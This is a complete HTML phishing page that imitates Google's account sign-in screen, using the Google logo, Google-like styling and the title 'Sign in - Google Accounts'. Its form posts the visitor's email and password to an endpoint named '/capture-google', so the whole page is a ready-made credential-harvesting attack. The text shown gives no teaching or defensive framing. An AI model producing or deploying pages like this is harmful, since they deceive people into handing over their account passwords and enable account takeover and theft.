<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Roboto', arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #fff; }
        .login-card { width: 450px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
        .input-field { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        .btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; float: right; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="login-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        <form action="/capture-google" method="post">
            <input type="email" name="email" class="input-field" placeholder="Email or phone" required>
            <input type="password" name="password" class="input-field" placeholder="Enter your password" required>
            <div style="text-align: left; color: #1a73e8; font-size: 14px; font-weight: 500; margin-top: 10px;">Forgot email?</div>
            <button type="submit" class="btn">Next</button>
        </form>
    </div>
</body>
</html>
